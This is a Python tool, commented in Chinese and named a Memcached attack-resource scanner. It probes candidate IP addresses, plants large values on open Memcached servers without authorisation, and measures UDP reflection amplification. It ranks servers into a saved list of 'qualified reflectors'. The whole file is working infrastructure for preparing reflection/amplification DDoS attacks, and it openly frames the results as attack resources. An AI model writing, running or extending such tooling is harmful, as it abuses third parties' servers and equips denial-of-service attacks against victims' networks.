#!/usr/bin/env python3
"""
Memcached 攻击资源扫描器 — 基于放大率测量的优质 Memcached 反射器发现工具

核心逻辑（源自 temp/memcached 下的手动测试脚本）：
  1. 加载候选 Memcached 服务器 IP 列表
  2. 对每台服务器验证可用性（TCP 连接 + 基本 set/get）
  3. 在可用服务器上预置大 value（100~400KB）
  4. 构造 UDP get 请求，计算 放大率 = 响应字节数 / 请求字节数
  5. 按放大率阈值、可靠性阈值过滤，产出"优质攻击资源"
"""

from __future__ import annotations

import csv
import json
import os
import random
import socket
import struct
import statistics
import threading
import time
import traceback
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

try:
    from pymemcache.client.base import Client
    from pymemcache.exceptions import MemcacheError
    _HAS_PYMEMCACHE = True
except ImportError:
    _HAS_PYMEMCACHE = False


# ── 常量 ──────────────────────────────────────────────

# Memcached 支持的探测命令类型
MEMCACHED_CMD_TYPES = {
    "get": "get {key}\r\n",          # 标准 get 命令
    "gets": "gets {key}\r\n",        # gets 命令（带 cas token）
    "stats": "stats\r\n",            # stats 命令（通常响应较大）
    "stats_items": "stats items\r\n",  # stats items
    "stats_slabs": "stats slabs\r\n",  # stats slabs
}

DEFAULT_CMD_TYPE = "get"
DEFAULT_DATA_SIZE_KB = 300          # 预置数据大小（KB）
DEFAULT_TIMEOUT_SEC = 3.0
DEFAULT_CONCURRENCY = 50
DEFAULT_MIN_AMPLIFICATION = 10.0    # 低于此倍数的直接丢弃
DEFAULT_MIN_RELIABILITY = 50.0      # 应答成功率低于此值的丢弃


# ── 数据类 ────────────────────────────────────────────

@dataclass
class ServerResult:
    ip: str
    cmd_type: str
    available: bool = False          # TCP 是否可达
    set_ok: bool = False             # set 数据是否成功
    responded: bool = False          # UDP 是否响应
    request_bytes: int = 0
    response_bytes: int = 0
    amplification_factor: float = 0.0
    latency_ms: float = 0.0
    data_size_kb: int = 0
    error: str = ""


@dataclass
class ScanConfig:
    """一次 Memcached 资源扫描的配置"""
    ip_file: str = ""                              # 输入 IP 列表文件
    output_dir: str = ""                           # 结果输出目录
    cmd_type: str = DEFAULT_CMD_TYPE               # 探测命令类型
    data_size_kb: int = DEFAULT_DATA_SIZE_KB       # 预置数据大小（KB）
    timeout_sec: float = DEFAULT_TIMEOUT_SEC
    concurrency: int = DEFAULT_CONCURRENCY
    min_amplification: float = DEFAULT_MIN_AMPLIFICATION
    min_reliability: float = DEFAULT_MIN_RELIABILITY
    max_ips: int = 0                               # 0 = 不限制
    memcached_port: int = 11211                    # Memcached 端口


# ── 工具函数 ──────────────────────────────────────────

def _build_memcached_udp_request(cmd_type: str, key: str = "test_key") -> bytes:
    """构建 Memcached UDP 请求包"""
    request_id = random.randint(0, 65535)
    # Memcached UDP header: request_id (2) + seq_num (2) + num_datagrams (2) + reserved (2)
    udp_header = struct.pack("!HHHH", request_id, 0x0000, 0x0001, 0x0000)

    if cmd_type == "get":
        body = f"get {key}\r\n".encode()
    elif cmd_type == "gets":
        body = f"gets {key}\r\n".encode()
    elif cmd_type == "stats":
        body = b"stats\r\n"
    elif cmd_type == "stats_items":
        body = b"stats items\r\n"
    elif cmd_type == "stats_slabs":
        body = b"stats slabs\r\n"
    else:
        body = f"get {key}\r\n".encode()

    return udp_header + body


def _test_tcp_available(ip: str, port: int, timeout: float) -> tuple[bool, str]:
    """测试 Memcached TCP 是否可达"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.close()
        return True, ""
    except socket.timeout:
        return False, "tcp_timeout"
    except Exception as e:
        return False, str(e)[:80]


def _test_set_data(ip: str, port: int, data_size_kb: int, timeout: float) -> tuple[bool, str, str]:
    """
    测试在 Memcached 上设置大数据
    返回: (是否成功, key, 错误信息)
    """
    if not _HAS_PYMEMCACHE:
        return False, "", "pymemcache not installed"

    try:
        client = Client(
            (ip, port),
            connect_timeout=timeout,
            timeout=timeout * 2,
            no_delay=True,
        )

        key = f"scan_{int(time.time())}_{random.randint(1000, 9999)}"
        data_size = data_size_kb * 1024
        large_value = 'A' * data_size

        ok = client.set(key, large_value)
        if not ok:
            client.close()
            return False, "", "set_failed"

        # 验证数据
        retrieved = client.get(key)
        if retrieved and len(retrieved) >= data_size * 0.95:  # 允许 5% 误差
            client.close()
            return True, key, ""
        else:
            actual = len(retrieved) if retrieved else 0
            client.close()
            return False, "", f"verify_failed: expected {data_size}, got {actual}"

    except Exception as e:
        return False, "", str(e)[:100]


def _test_udp_amplification(
    ip: str,
    port: int,
    cmd_type: str,
    key: str,
    timeout: float,
) -> ServerResult:
    """对单个 Memcached 服务器做 UDP 放大率测试"""
    result = ServerResult(
        ip=ip,
        cmd_type=cmd_type,
        responded=False,
    )

    try:
        request_data = _build_memcached_udp_request(cmd_type, key)
        request_size = len(request_data)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)

        start = time.time()
        sock.sendto(request_data, (ip, port))

        # 尝试接收响应（可能多个包）
        total_resp_size = 0
        max_wait = timeout
        end_time = start + max_wait

        while time.time() < end_time:
            try:
                remaining = end_time - time.time()
                if remaining <= 0:
                    break
                sock.settimeout(min(remaining, 0.5))
                data, _ = sock.recvfrom(65535)
                total_resp_size += len(data)
                # Memcached UDP 响应可能分多个包，header 里有 num_datagrams
                if len(data) >= 8:
                    _, _, num_dgrams, _ = struct.unpack("!HHHH", data[:8])
                    if num_dgrams <= 1:
                        break
            except socket.timeout:
                break

        end = time.time()
        sock.close()

        if total_resp_size > 8:  # 起码有 UDP header
            result.responded = True
            result.request_bytes = request_size
            result.response_bytes = total_resp_size
            result.amplification_factor = round(total_resp_size / request_size, 2) if request_size > 0 else 0
            result.latency_ms = round((end - start) * 1000, 1)

    except socket.timeout:
        result.error = "udp_timeout"
        result.request_bytes = len(_build_memcached_udp_request(cmd_type, key))
    except Exception as e:
        result.error = str(e)[:80]
        result.request_bytes = len(_build_memcached_udp_request(cmd_type, key))
    finally:
        try:
            sock.close()
        except Exception:
            pass

    return result


# ── Memcached 资源扫描器 ────────────────────────────────

class MemcachedResourceScanner:
    """Memcached 攻击资源扫描器 —— 多 IP 放大率测量流水线"""

    def __init__(self):
        self._is_running = False
        self._stop_event = threading.Event()
        self._stats_lock = threading.Lock()
        self._scan_thread: Optional[threading.Thread] = None

        # 实时统计
        self.stats: Dict[str, Any] = {
            "total_ips": 0,
            "tested": 0,
            "available": 0,
            "set_ok": 0,
            "responded": 0,
            "failed": 0,
            "qualified": 0,
            "elapsed_sec": 0.0,
            "current_ip": "",
            "progress_percent": 0.0,
            "stage": "idle",
            "current_stage": None,
            "status": "idle",
            "started_at": None,
            "ended_at": None,
            "stages": {},
            "config": {},
        }
        self._all_results: List[ServerResult] = []
        self._qualified_ips: List[str] = []
        self._log_lines: List[str] = []
        self._log_callback: Optional[Callable[[str], None]] = None
        self._server_keys: Dict[str, str] = {}  # 存储 server -> key 映射

    # ── 公开 API ──────────────────────────────────────

    @property
    def is_running(self) -> bool:
        return self._is_running

    def run_scan(self, config: ScanConfig,
                 progress_callback: Optional[Callable[[Dict[str, Any]], None]] = None,
                 log_callback: Optional[Callable[[str], None]] = None) -> None:
        """启动扫描（阻塞调用，请在子线程中执行）"""
        if self._is_running:
            raise RuntimeError("扫描已在运行中")

        self._is_running = True
        self._stop_event.clear()
        self._log_callback = log_callback
        self._all_results = []
        self._qualified_ips = []
        self._server_keys = {}
        started_at = datetime.now().astimezone().isoformat(timespec="seconds")

        self.stats = {
            "total_ips": 0, "tested": 0, "available": 0, "set_ok": 0,
            "responded": 0, "failed": 0, "qualified": 0,
            "elapsed_sec": 0.0, "current_ip": "",
            "progress_percent": 0.0, "stage": "loading", "current_stage": "loading",
            "status": "running", "started_at": started_at, "ended_at": None, "stages": {},
            "config": {
                "ip_file": os.path.basename(config.ip_file),
                "cmd_type": config.cmd_type,
                "data_size_kb": config.data_size_kb,
                "timeout_sec": config.timeout_sec,
                "concurrency": config.concurrency,
                "min_amplification": config.min_amplification,
                "min_reliability": config.min_reliability,
                "max_ips": config.max_ips,
                "memcached_port": config.memcached_port,
            },
        }
        self._update_stage("loading", "running")

        os.makedirs(config.output_dir, exist_ok=True)
        start_time = time.time()

        try:
            # Stage 1: 加载 IP
            self._log("📂 加载 IP 列表 …")
            ips = _load_ips(config.ip_file)
            if config.max_ips > 0 and len(ips) > config.max_ips:
                ips = ips[:config.max_ips]
            if not ips:
                self._log("❌ IP 列表为空，退出。")
                self._update_stage("loading", "completed", total_ips=0)
                self._finalize_run("completed", start_time)
                return

            with self._stats_lock:
                self.stats["total_ips"] = len(ips)
            self._update_stage("loading", "completed", total_ips=len(ips))
            self._log(f"✅ 加载 {len(ips)} 个候选 IP")

            # Stage 2: Memcached 探测（TCP 可用性 + 预置数据 + UDP 放大率）
            self._update_stage("scanning", "running")
            self._log(f"🔍 开始 Memcached 探测（命令类型: {config.cmd_type}, 数据大小: {config.data_size_kb}KB）…")

            semaphore = threading.Semaphore(config.concurrency)
            results_lock = threading.Lock()
            threads: List[threading.Thread] = []

            def _worker(ip: str):
                semaphore.acquire()
                try:
                    if self._stop_event.is_set():
                        return
                    with self._stats_lock:
                        self.stats["current_ip"] = ip

                    res = self._scan_single_server(ip, config)

                    with results_lock:
                        self._all_results.append(res)
                        cnt = len(self._all_results)
                        self.stats["tested"] = cnt
                        self.stats["progress_percent"] = round(cnt / max(1, self.stats["total_ips"]) * 100, 1)
                        if res.available:
                            self.stats["available"] = self.stats.get("available", 0) + 1
                        if res.set_ok:
                            self.stats["set_ok"] = self.stats.get("set_ok", 0) + 1
                        if res.responded:
                            self.stats["responded"] = self.stats.get("responded", 0) + 1
                        else:
                            self.stats["failed"] = self.stats.get("failed", 0) + 1
                finally:
                    semaphore.release()

            for ip in ips:
                if self._stop_event.is_set():
                    break
                t = threading.Thread(target=_worker, args=(ip,), daemon=True)
                t.start()
                threads.append(t)
                # 小延迟避免瞬间爆发
                if len(threads) % 20 == 0:
                    time.sleep(0.001)

            for t in threads:
                if t.is_alive():
                    t.join(timeout=0.5)
            threads.clear()

            if self._stop_event.is_set():
                self._update_stage("scanning", "stopped")
                self._finalize_run("stopped", start_time)
                self._log("🛑 扫描已停止。")
                return

            self._update_stage("scanning", "completed")

            # Stage 3: 筛选
            if not self._stop_event.is_set():
                self._log("🔍 筛选高放大率优质资源 …")
                self._update_stage("filtering", "running")

                self._qualified_ips, summary = _filter_and_rank(
                    self._all_results,
                    config.min_amplification,
                    config.min_reliability,
                )
                with self._stats_lock:
                    self.stats["qualified"] = len(self._qualified_ips)
                self._update_stage("filtering", "completed", qualified=len(self._qualified_ips))

                avg_amp = float(summary.get("avg_amplification", 0.0) or 0.0)
                max_amp = float(summary.get("max_amplification", 0.0) or 0.0)
                self._log(f"📊 筛选结果: {summary['available_ips']} 个可用 → "
                          f"{summary['responded_ips']} 个有响应 → "
                          f"{summary['qualified_count']} 个优质资源")
                self._log(f"   平均放大率: {avg_amp:.2f}x, 最大放大率: {max_amp:.2f}x")

            if self._stop_event.is_set():
                self._update_stage("filtering", "stopped")
                self._finalize_run("stopped", start_time)
                self._log("🛑 扫描已停止。")
                return

            # Stage 4: 保存
            self._update_stage("saving", "running")
            if not self._stop_event.is_set():
                self._save_results(config, summary)
                self._log(f"💾 结果已保存至 {config.output_dir}")
            self._update_stage("saving", "completed", saved=bool(self._qualified_ips))

            self._finalize_run("completed", start_time)
            self._log(f"✅ 扫描完成，耗时 {self.stats['elapsed_sec']} 秒。")

        except Exception as exc:
            self._log(f"❌ 扫描异常: {exc}\n{traceback.format_exc()}")
            current_stage = self.get_stats().get("current_stage")
            if current_stage:
                self._update_stage(current_stage, "failed", error=str(exc))
            self._finalize_run("error", start_time, error=str(exc))
        finally:
            self._is_running = False
            # 清理服务器上的预置数据
            self._cleanup_server_data(config.memcached_port)
            if progress_callback:
                progress_callback(dict(self.stats))

    def stop(self) -> None:
        self._stop_event.set()
        self._log("🛑 收到停止信号 …")

    def get_results(self, limit: int = 200) -> List[Dict[str, Any]]:
        return [asdict(r) for r in self._all_results[:limit]]

    def get_qualified_ips(self) -> List[str]:
        return list(self._qualified_ips)

    def get_stats(self) -> Dict[str, Any]:
        with self._stats_lock:
            return dict(self.stats)

    def get_logs(self, tail: int = 200) -> str:
        lines = self._log_lines[-tail:] if tail > 0 else self._log_lines
        return "\n".join(lines)

    # ── 内部 ──────────────────────────────────────────

    def _scan_single_server(self, ip: str, config: ScanConfig) -> ServerResult:
        """扫描单个服务器：TCP 可用性 -> set 数据 -> UDP 放大率测试"""
        result = ServerResult(
            ip=ip,
            cmd_type=config.cmd_type,
            data_size_kb=config.data_size_kb,
        )

        # Step 1: TCP 可用性测试
        available, tcp_err = _test_tcp_available(ip, config.memcached_port, config.timeout_sec)
        result.available = available
        if not available:
            result.error = tcp_err
            return result

        # Step 2: 预置大数据（仅对 get/gets 命令类型需要）
        key = ""
        if config.cmd_type in ("get", "gets"):
            set_ok, key, set_err = _test_set_data(ip, config.memcached_port, config.data_size_kb, config.timeout_sec)
            result.set_ok = set_ok
            if not set_ok:
                result.error = set_err
                return result
            # 保存 key 用于后续清理
            self._server_keys[ip] = key
        else:
            # stats 类命令不需要预置数据
            result.set_ok = True

        # Step 3: UDP 放大率测试
        udp_result = _test_udp_amplification(
            ip, config.memcached_port, config.cmd_type, key, config.timeout_sec
        )
        result.responded = udp_result.responded
        result.request_bytes = udp_result.request_bytes
        result.response_bytes = udp_result.response_bytes
        result.amplification_factor = udp_result.amplification_factor
        result.latency_ms = udp_result.latency_ms
        if udp_result.error:
            result.error = udp_result.error

        return result

    def _cleanup_server_data(self, port: int) -> None:
        """清理扫描过程中在 Memcached 服务器上预置的数据"""
        if not self._server_keys:
            return
        self._log("🧹 清理 Memcached 服务器预置数据 …")

        def cleanup(server: str, key: str):
            try:
                if not _HAS_PYMEMCACHE:
                    return
                client = Client((server, port), timeout=3, connect_timeout=3)
                client.delete(key)
                client.close()
            except Exception:
                pass

        threads = []
        for server, key in list(self._server_keys.items()):
            t = threading.Thread(target=cleanup, args=(server, key))
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=3)

        self._server_keys.clear()
        self._log("✅ 清理完成")

    def _log(self, msg: str):
        timestamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{timestamp}] {msg}"
        self._log_lines.append(line)
        if self._log_callback:
            self._log_callback(line)

    def _update_stage(self, stage: str, status: str, **extra: Any) -> None:
        timestamp = datetime.now().astimezone().isoformat(timespec="seconds")
        with self._stats_lock:
            stages = self.stats.setdefault("stages", {})
            current = stages.setdefault(stage, {})
            current.update({"status": status, **extra})
            current.setdefault("started_at", timestamp)
            if status == "running":
                self.stats["stage"] = stage
                self.stats["current_stage"] = stage
            if status in {"completed", "failed", "skipped", "stopped"}:
                current["ended_at"] = timestamp
                if self.stats.get("current_stage") == stage and status in {"failed", "stopped"}:
                    self.stats["current_stage"] = None

    def _finalize_run(self, status: str, start_time: float, error: str = "") -> None:
        ended_at = datetime.now().astimezone().isoformat(timespec="seconds")
        final_stage = {"completed": "done", "error": "error", "stopped": "stopped"}.get(
            status, self.stats.get("stage", "idle")
        )
        with self._stats_lock:
            self.stats["status"] = status
            self.stats["stage"] = final_stage
            self.stats["current_stage"] = None
            self.stats["ended_at"] = ended_at
            self.stats["elapsed_sec"] = round(time.time() - start_time, 1)
            if error:
                self.stats["error"] = error

    def _save_results(self, config: ScanConfig, summary: Dict[str, Any]):
        out = Path(config.output_dir)
        out.mkdir(parents=True, exist_ok=True)

        # 优质 IP 列表（纯文本）
        ip_file = out / "qualified_ips.txt"
        with ip_file.open("w", encoding="utf-8") as f:
            f.write(f"# Memcached 优质反射器 IP 列表（放大率 ≥ {config.min_amplification}x）\n")
            f.write(f"# 命令类型: {config.cmd_type}\n")
            f.write(f"# 生成时间: {datetime.now().isoformat()}\n")
            for ip in self._qualified_ips:
                f.write(f"{ip}\n")

        # 完整 CSV
        csv_file = out / "scan_results.csv"
        with csv_file.open("w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["IP", "CmdType", "Available", "SetOK", "Responded",
                             "RequestBytes", "ResponseBytes", "Amplification",
                             "LatencyMs", "DataSizeKB", "Error"])
            for r in self._all_results:
                writer.writerow([
                    r.ip, r.cmd_type, r.available, r.set_ok, r.responded,
                    r.request_bytes, r.response_bytes, r.amplification_factor,
                    r.latency_ms, r.data_size_kb, r.error,
                ])

        # JSON 汇总
        summary_file = out / "scan_summary.json"
        with summary_file.open("w", encoding="utf-8") as f:
            json.dump(summary, f, ensure_ascii=False, indent=2)

        self._log(f"📄 qualified_ips.txt | scan_results.csv | scan_summary.json")


# ── 辅助函数 ──────────────────────────────────────────

def _load_ips(file_path: str) -> List[str]:
    """从文件加载 IP 列表"""
    path = Path(file_path)
    if not path.exists():
        return []
    ips = []
    with path.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                # 只取 IP，忽略逗号分隔的额外列
                ip = line.split(",")[0].strip()
                if ip:
                    ips.append(ip)
    return ips


def _filter_and_rank(
    all_results: List[ServerResult],
    min_amplification: float,
    min_reliability: float,
) -> tuple:
    """筛选、去重、排序"""
    # 按 IP 聚合（每个 IP 应该只有一条结果）
    ip_data: Dict[str, Dict[str, Any]] = {}
    for r in all_results:
        entry = ip_data.setdefault(r.ip, {
            "factors": [],
            "latencies": [],
            "total": 0,
            "responded": 0,
            "available": False,
            "set_ok": False,
        })
        entry["total"] += 1
        if r.available:
            entry["available"] = True
        if r.set_ok:
            entry["set_ok"] = True
        if r.responded:
            entry["responded"] += 1
            entry["factors"].append(r.amplification_factor)
            entry["latencies"].append(r.latency_ms)

    qualified = []
    available_ips = 0
    responded_ips = 0

    for ip, data in ip_data.items():
        if data["available"]:
            available_ips += 1
        if data["responded"] == 0:
            continue
        responded_ips += 1

        reliability = (data["responded"] / data["total"]) * 100
        avg_amp = statistics.mean(data["factors"]) if data["factors"] else 0
        avg_latency = statistics.mean(data["latencies"]) if data["latencies"] else 0

        if avg_amp >= min_amplification and reliability >= min_reliability:
            qualified.append((avg_amp, ip, reliability, avg_latency))

    # 按放大率降序
    qualified.sort(key=lambda x: x[0], reverse=True)

    all_factors = [v for d in ip_data.values() for v in d["factors"]]
    max_amp = max(all_factors) if all_factors else 0
    avg_amp_all = statistics.mean(all_factors) if all_factors else 0

    qualified_ips = [ip for _, ip, _, _ in qualified]
    summary = {
        "total_ips": len(ip_data),
        "available_ips": available_ips,
        "responded_ips": responded_ips,
        "qualified_count": len(qualified),
        "qualified_ips": qualified_ips,
        "min_amplification_threshold": min_amplification,
        "min_reliability_threshold": min_reliability,
        "avg_amplification": round(avg_amp_all, 2),
        "max_amplification": round(max_amp, 2),
        "top_10": [
            {"ip": ip, "amplification": round(amp, 2), "reliability": round(rel, 1), "latency_ms": round(lat, 1)}
            for amp, ip, rel, lat in qualified[:10]
        ],
        "timestamp": datetime.now().isoformat(),
    }
    return qualified_ips, summary


# ── CLI 入口 ──────────────────────────────────────────

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Memcached 攻击资源扫描器")
    parser.add_argument("--ip-file", required=True, help="候选 Memcached 服务器 IP 列表")
    parser.add_argument("--output-dir", default="./memcached_scan_output", help="输出目录")
    parser.add_argument("--cmd-type", default="get", choices=list(MEMCACHED_CMD_TYPES.keys()),
                        help="探测命令类型")
    parser.add_argument("--data-size-kb", type=int, default=300, help="预置数据大小（KB）")
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument("--concurrency", type=int, default=50)
    parser.add_argument("--min-amp", type=float, default=10.0)
    parser.add_argument("--min-reliability", type=float, default=50.0)
    parser.add_argument("--max-ips", type=int, default=0)
    parser.add_argument("--port", type=int, default=11211, help="Memcached 端口")

    args = parser.parse_args()

    config = ScanConfig(
        ip_file=args.ip_file,
        output_dir=args.output_dir,
        cmd_type=args.cmd_type,
        data_size_kb=args.data_size_kb,
        timeout_sec=args.timeout,
        concurrency=args.concurrency,
        min_amplification=args.min_amp,
        min_reliability=args.min_reliability,
        max_ips=args.max_ips,
        memcached_port=args.port,
    )

    scanner = MemcachedResourceScanner()

    def print_log(msg: str):
        print(msg)

    scanner.run_scan(config, log_callback=print_log)

    print("\n📊 最终统计:")
    stats = scanner.get_stats()
    for k, v in stats.items():
        print(f"  {k}: {v}")
    print(f"\n优质资源 ({len(scanner.get_qualified_ips())} 个):")
    for ip in scanner.get_qualified_ips()[:10]:
        print(f"    {ip}")


if __name__ == "__main__":
    main()
